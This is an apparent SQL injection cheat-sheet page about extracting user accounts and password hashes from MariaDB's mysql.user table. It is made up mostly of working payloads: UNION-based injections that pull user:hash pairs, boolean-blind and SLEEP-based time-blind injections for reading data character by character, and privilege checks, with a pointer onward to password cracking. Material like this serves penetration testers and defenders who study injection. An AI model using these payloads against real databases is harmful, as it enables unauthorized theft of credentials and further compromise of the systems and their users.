---
title: Database Credentials
description: How to retrieve database credentials in MariaDB
category: Information Gathering
order: 5
tags: ["credentials", "authentication", "user data"]
lastUpdated: 2025-12-18
---

## Database Credentials

When performing SQL injection attacks against MariaDB, extracting database credentials can provide valuable information for further exploitation.

| Information  | Query                                                                         |
| ------------ | ----------------------------------------------------------------------------- |
| Table        | `mysql.user`                                                                  |
| Columns      | `User`, `Password`, `authentication_string`, `plugin`                         |
| Current User | `USER()`, `CURRENT_USER()`, `CURRENT_USER`, `SYSTEM_USER()`, `SESSION_USER()` |

## Current User Functions

MariaDB provides several functions to retrieve the current user:

| Function         | Description                              | Example Output    |
| ---------------- | ---------------------------------------- | ----------------- |
| `USER()`         | Current user (user@host from connection) | `root@172.18.0.1` |
| `CURRENT_USER()` | Authenticated user (may differ)          | `root@%`          |
| `CURRENT_USER`   | Same as CURRENT_USER() (no parens)       | `root@%`          |
| `SYSTEM_USER()`  | Alias for USER()                         | `root@172.18.0.1` |
| `SESSION_USER()` | Alias for USER()                         | `root@172.18.0.1` |

```sql
-- Get current user
SELECT USER()

-- Get authenticated user (may differ with proxy users)
SELECT CURRENT_USER()

-- CURRENT_USER can be used without parentheses
SELECT CURRENT_USER

-- All user functions at once
SELECT
  USER() AS user_func,
  CURRENT_USER() AS current_user_func,
  SYSTEM_USER() AS system_user_func,
  SESSION_USER() AS session_user_func
```

**Note:** `USER()`, `SYSTEM_USER()`, and `SESSION_USER()` return identical results. `CURRENT_USER()` may differ when using proxy users or role changes. `CURRENT_USER` can be used with or without parentheses.

### Extracting Username Only

Use `SUBSTRING_INDEX` to extract just the username or host portion:

```sql
-- Extract username (before @)
SELECT SUBSTRING_INDEX(USER(), '@', 1) AS username

-- Extract host (after @)
SELECT SUBSTRING_INDEX(USER(), '@', -1) AS host

-- From CURRENT_USER
SELECT SUBSTRING_INDEX(CURRENT_USER(), '@', 1) AS username
```

## mysql.user Table

The `mysql.user` table contains all user accounts and their credentials. Accessing this table requires elevated privileges.

### Basic Queries

```sql
-- List all users
SELECT User, Host FROM mysql.user

-- List usernames only
SELECT User FROM mysql.user LIMIT 5

-- Count users
SELECT COUNT(*) FROM mysql.user

-- Query specific user
SELECT User, Host FROM mysql.user WHERE User = 'root'
```

### Password/Hash Columns

MariaDB stores password hashes in different columns depending on version:

| Column                  | Description                                                      |
| ----------------------- | ---------------------------------------------------------------- |
| `Password`              | Traditional password hash column                                 |
| `authentication_string` | Alternative hash storage (newer)                                 |
| `plugin`                | Authentication plugin (e.g., `mysql_native_password`, `ed25519`) |

```sql
-- Query Password column (any user)
SELECT User, Password FROM mysql.user LIMIT 1

-- Query Password for specific user
SELECT User, Password FROM mysql.user WHERE User = 'root' LIMIT 1

-- Query authentication_string column
SELECT User, authentication_string FROM mysql.user WHERE User = 'root' LIMIT 1

-- Query plugin to see authentication method
SELECT User, plugin FROM mysql.user LIMIT 3
```

## Credential Extraction

### Using CONCAT_WS

`CONCAT_WS` (Concatenate With Separator) is useful for extracting formatted credentials:

```sql
-- Using hex separator (0x3A = colon)
SELECT CONCAT_WS(0x3A, User, Password) AS creds FROM mysql.user WHERE User = 'root'
-- Returns: root:*HASH...

-- Using literal colon
SELECT CONCAT_WS(':', User, Password) AS creds FROM mysql.user LIMIT 1

-- Handle NULL passwords with COALESCE (CONCAT_WS skips NULL values)
SELECT CONCAT_WS(':', User, COALESCE(Password, '')) AS creds FROM mysql.user LIMIT 1

-- Multiple fields (user:host:hash)
SELECT CONCAT_WS(':', User, Host, Password) AS full_creds FROM mysql.user LIMIT 1
```

### Using GROUP_CONCAT

Extract multiple users at once:

```sql
-- All usernames comma-separated
SELECT GROUP_CONCAT(User) AS users FROM mysql.user

-- With custom separator
SELECT GROUP_CONCAT(User SEPARATOR '|') AS users FROM mysql.user

-- User:hash pairs with newline separator
SELECT GROUP_CONCAT(CONCAT(User, ':', Password) SEPARATOR '\n') AS creds FROM mysql.user
```

## UNION-Based Extraction

### Current User

```sql
-- Extract current user via UNION
' UNION SELECT 1, USER() -- -

-- Full query example
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, USER()
```

### From mysql.user

```sql
-- Extract users from mysql.user (requires privileges)
' UNION SELECT 1, User FROM mysql.user LIMIT 1 -- -

-- Full query context (extracting username)
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, User FROM mysql.user LIMIT 1

-- Extract credentials with CONCAT_WS
' UNION SELECT 1, CONCAT_WS(':', User, Password) FROM mysql.user LIMIT 1 -- -

-- Full query context (extracting credentials)
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT_WS(':', User, Password) FROM mysql.user LIMIT 1
```

### Subquery Extraction

```sql
-- Extract via subquery
SELECT (SELECT USER()) AS current_usr

-- CASE WHEN for conditional extraction
SELECT CASE
  WHEN USER() LIKE 'root@%' THEN 'is_root'
  ELSE 'not_root'
END AS user_check
```

## information_schema Alternative

When `mysql.user` is inaccessible, use `information_schema.user_privileges`:

```sql
-- Query privileges for current user
SELECT GRANTEE, PRIVILEGE_TYPE FROM information_schema.user_privileges
WHERE REPLACE(SUBSTRING_INDEX(GRANTEE, '@', 1), "'", '') = SUBSTRING_INDEX(USER(), '@', 1)
LIMIT 5

-- List all grantees
SELECT DISTINCT GRANTEE FROM information_schema.user_privileges LIMIT 10

-- Check for specific privilege
SELECT COUNT(*) AS has_select FROM information_schema.user_privileges
WHERE REPLACE(SUBSTRING_INDEX(GRANTEE, '@', 1), "'", '') = SUBSTRING_INDEX(USER(), '@', 1)
AND PRIVILEGE_TYPE = 'SELECT'
```

## Privilege Checks

### SHOW GRANTS

```sql
-- Show grants for current user
SHOW GRANTS FOR CURRENT_USER()

-- Show grants (implicit current user)
SHOW GRANTS
```

### Checking Specific Privileges

```sql
-- Check if superuser
SELECT COUNT(*) AS is_super FROM information_schema.user_privileges
WHERE REPLACE(SUBSTRING_INDEX(GRANTEE, '@', 1), "'", '') = SUBSTRING_INDEX(USER(), '@', 1)
AND PRIVILEGE_TYPE = 'SUPER'

-- Check FILE privilege (needed for file operations)
SELECT COUNT(*) AS has_file FROM information_schema.user_privileges
WHERE REPLACE(SUBSTRING_INDEX(GRANTEE, '@', 1), "'", '') = SUBSTRING_INDEX(USER(), '@', 1)
AND PRIVILEGE_TYPE = 'FILE'
```

## Database and Host Information

Combine user info with server details:

```sql
-- Current database
SELECT DATABASE() AS db

-- Server hostname
SELECT @@hostname AS host

-- Connection/thread ID
SELECT CONNECTION_ID() AS cid

-- Combined server and user information
SELECT
  USER() AS user,
  DATABASE() AS db,
  @@hostname AS host,
  @@version AS version
```

## Blind Extraction Techniques

When direct output is not visible:

### Character-by-Character Extraction

```sql
-- Get username length
SELECT LENGTH(SUBSTRING_INDEX(USER(), '@', 1)) AS len

-- Extract first character
SELECT SUBSTRING(USER(), 1, 1) AS first_char

-- Get ASCII value
SELECT ASCII(SUBSTRING(USER(), 1, 1)) AS ascii_val
```

### Boolean-Based Checks

```sql
-- Check if root user
SELECT IF(USER() LIKE 'root@%', 1, 0) AS is_root

-- In injection context (character comparison)
' AND IF(SUBSTRING(USER(),1,1)='r', 1, 0) -- -

-- In injection context (ASCII comparison)
' AND IF(ASCII(SUBSTRING(USER(),1,1))=114, 1, 0) -- -

-- Check username length in injection context
' AND LENGTH(SUBSTRING_INDEX(USER(), '@', 1)) = 4 -- -
```

### Time-Based Extraction

```sql
-- Delay if user is root
' AND IF(USER() LIKE 'root@%', SLEEP(5), 0) -- -

-- Extract character with timing
' AND IF(ASCII(SUBSTRING(USER(),1,1))=114, SLEEP(5), 0) -- -
```

## MariaDB-Specific Notes

- MariaDB uses `mysql_native_password` by default for password hashing
- The `Password` column contains hashed values, not plaintext
- MariaDB may use either `Password` or `authentication_string` columns depending on version and plugin
- The `ed25519` plugin is MariaDB-specific and more secure than `mysql_native_password`

For more information on password hashing and cracking, see the related entries on [Password Hashing](password-hashing) and [Password Cracking](password-cracking).
